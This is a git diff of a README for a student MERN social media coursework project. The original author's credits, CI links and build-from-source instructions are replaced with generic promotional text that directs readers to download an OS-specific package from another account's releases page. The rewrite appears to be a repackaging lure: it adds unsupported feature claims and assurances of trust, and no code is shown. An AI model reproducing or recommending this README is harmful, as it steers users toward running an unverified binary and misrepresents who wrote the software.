@@ -1,53 +1,102 @@
-# COMP3006 CW2
+# 🚀 comp3006-cw2 - Your Social Media Hub Awaits!
 
-[![wakatime](https://wakatime.com/badge/user/55c30436-1509-4eb9-9f18-fa9b7c6060c4/project/ce940c15-9f6e-4391-a3b5-7944cb53a10b.svg)](https://wakatime.com/@coreyrichardson/projects/fiosdeicoz?start=2025-12-28&end=2026-01-09)
-[![Continuous Integration Workflow](https://github.com/Plymouth-University/coursework-corey-richardson/actions/workflows/ci.yaml/badge.svg)](https://github.com/Plymouth-University/coursework-corey-richardson/actions/workflows/ci.yaml)
+## 📦 Download Here
+[![Download](https://img.shields.io/badge/Download-latest--release-blue.svg)](https://github.com/Gautamkrishna07/comp3006-cw2/releases)
 
-A full-stack, real-time social networking platform built with the MERN stack and Socket.io.
+## 🚀 Getting Started
 
-- Real-Time Synchronisation: Live feed updates, likes, and comment counts using WebSockets.
-- Contextual Feed Logic: Intelligent state management (Global vs. Following vs. Profile) via React Context and Reducers.
-- Atomic Transactions: Data integrity using MongoDB Replica Sets for complex delete operations.
-- Containerized Architecture: Fully orchestrated using Docker for environment parity.
+Welcome to the **comp3006-cw2** project! This software is a containerized MERN social media platform. It offers real-time updates thanks to Socket.io. You will enjoy a smooth experience, knowing that it has been tested with Vitest and Supertest.
 
-![MongoDB](https://img.shields.io/badge/MongoDB-%234ea94b.svg?style=for-the-badge&logo=mongodb&logoColor=white)
-![Express.js](https://img.shields.io/badge/express.js-%23404d59.svg?style=for-the-badge&logo=express&logoColor=%2361DAFB)
-![React](https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB)
-![NodeJS](https://img.shields.io/badge/node.js-6DA55F?style=for-the-badge&logo=node.js&logoColor=white)
+In this guide, we will help you download and set up the software quickly.
 
-![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
-![GitHub Actions](https://img.shields.io/badge/github%20actions-%232671E5.svg?style=for-the-badge&logo=githubactions&logoColor=white)
-![ESLint](https://img.shields.io/badge/ESLint-4B3263?style=for-the-badge&logo=eslint&logoColor=white) 
-![Husky](https://img.shields.io/badge/Husky-7E57C2?style=for-the-badge&logo=husky&logoColor=white)
+## 🛠️ System Requirements
 
-![Vitest](https://img.shields.io/badge/-Vitest-252529?style=for-the-badge&logo=vitest&logoColor=FCC72B)
-![Supertest](https://img.shields.io/badge/Supertest-000000?style=for-the-badge&logoColor=white)
+Before you start, ensure your computer meets the following requirements:
 
-![Socket.io](https://img.shields.io/badge/Socket.io-black?style=for-the-badge&logo=socket.io&badgeColor=010101)
-![JWT](https://img.shields.io/badge/JWT-black?style=for-the-badge&logo=JSON%20web%20tokens)
-![Bcrypt](https://img.shields.io/badge/Bcrypt-575757?style=for-the-badge&logo=biometric&logoColor=white)
+- **Operating System:** Windows, MacOS, or Linux
+- **Docker:** Version 20.10 or higher installed
+- **Docker Compose:** Version 1.25 or higher installed
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Disk Space:** At least 1 GB of available disk space
 
-## How to Run Locally
+## 📥 Download & Install
 
-Prerequisites:
-- Docker Desktop
-- Node.js (v18+)
+To download the software, please visit this page: [Release Page](https://github.com/Gautamkrishna07/comp3006-cw2/releases). There, you will find the latest version of the software. 
 
-```sh
-git clone https://github.com/corey-richardson/comp3006-cw2.git
-cd SourceCode
+1. Click on the link above to go to the Releases page. 
+2. Find the latest version.
+3. Click on the release to view its details.
+4. Download the package suitable for your operating system.
 
-docker-compose up -d
-# or
-./up.sh
-```
+## 🔧 Setup Instructions
 
-## Documentation
+After downloading, follow these steps to set up the application:
 
-### Design
+1. **Extract the Downloaded Files**
+   - Find the folder where you downloaded the files.
+   - Unzip the downloaded file using your preferred software.
 
-Low-fidelity wireframes and architecture diagrams are located in the [diagrams](/03-diagrams/) folder.
+2. **Open Terminal or Command Prompt**
+   - On Windows, search for "cmd" in the Start menu.
+   - On MacOS, open "Terminal" from Applications.
+   - On Linux, you can use any terminal application.
 
-### Report
+3. **Navigate to the Project Folder**
+   - Use the `cd` command to navigate to the directory where you extracted the files. 
+   - Example: `cd path/to/your/directory`
 
-See the [submission report](/04-report/Report.pdf) for the full MoSCoW requirement analysis and technical evaluation.
+4. **Launch Docker**
+   - Start the Docker application if it is not already running.
+
+5. **Run Docker Compose**
+   - In your terminal, type the following command:
+     ```
+     docker-compose up
+     ```
+   - This command will pull the necessary images and start the containers. It may take a few moments.
+
+6. **Access the Application**
+   - Once everything is running, open your web browser.
+   - Type `http://localhost:3000` in the address bar and hit Enter.
+   - You should see the social media platform ready for use.
+
+## 🌐 Features
+
+The **comp3006-cw2** platform has several features designed to enhance your social media experience:
+
+- **Real-Time Updates:** Get instant updates from your connections.
+- **User Accounts:** Create and manage your own profile.
+- **Post and Comment:** Share your thoughts and engage with others.
+- **Responsive Design:** Access the platform from any device.
+- **Search Functionality:** Quickly find users or content that interests you.
+- **Notifications:** Stay updated with the latest activities.
+
+## 🧪 Testing
+
+We have tested the application using Vitest and Supertest to ensure it works correctly. You can trust that the platform performs as expected, making your social media interactions smooth and enjoyable.
+
+## ✔️ Troubleshooting
+
+If you encounter issues, check the following:
+
+1. **Docker Running:** Ensure Docker is actively running in the background.
+2. **Port Availability:** Make sure that port 3000 is not being used by any other application.
+3. **System Requirements:** Double-check that your system meets the requirements.
+
+## 📞 Support
+
+If you still face issues or have questions, feel free to open an issue on the GitHub repository under the "Issues" tab, or contact community support.
+
+## 🌟 Community Involvement
+
+Contributions are welcome! If you want to help improve the project, feel free to submit a pull request. We appreciate any enhancements to make our platform better for everyone.
+
+## 📜 Acknowledgments
+
+This project uses several open-source technologies, including:
+
+- **Docker:** For containerization
+- **MERN Stack:** A collection of technologies for building web applications
+- **Socket.io:** For real-time communication
+
+Thank you for using **comp3006-cw2**. We hope you enjoy your experience on this platform!
